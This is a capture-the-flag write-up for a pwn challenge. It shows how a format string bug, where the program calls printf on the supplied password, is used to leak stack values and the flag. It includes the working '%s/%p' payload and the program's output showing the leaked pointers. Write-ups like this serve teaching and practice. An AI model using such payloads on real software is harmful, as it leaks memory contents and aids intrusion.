# Formatting into the danger zone

> > Pwn - 300pts
> 
> The program asks for a password, but it seems it prints the supplied password in a dangerous manner. Are you able to extract the flag?
> 
> IP and port: `95.85.37.12:1337`
> 
> PS: This is a pwn assignment, but you are not expected to pwn the machine, only extract the flag
> PPS: connect using `nc <ip> <port>`
> 
> File: [format](./format)

## Writeup

After some digging, we discover that this is a format string bug, where the program prints the user's password using:
`printf(<user input>)`

And checking the application, we can see that the flag is located on the stack, which can be utilized to retrieve it.
After some trial and error, we discover the input string `%s %s %s %p %p %p %p %p %p %p %s %s` will pop the string off the stack and print it.

- `%p` pops a pointer of the stack and prints the value as hex
- `%s` pops a pointer of the stack and prints the string it points to

Meaning we can execute:

```
➤ echo "%s %s %s %p %p %p %p %p %p %p %s %s" | ./format
Enter password: You entered: %s %s %s %p %p %p %p %p %p %p %s %s
 H=  ���� 0x3 0xc2 0x56210837d260 0x78 0x2a6932febc0d3800 0x7ffe17e29a30 0x562106f069d3 (null) UiTHack{format_strings_can_be_scary}
Which was wrong..
```

Yielding the flag:

`UiTHack{format_strings_can_be_scary}`
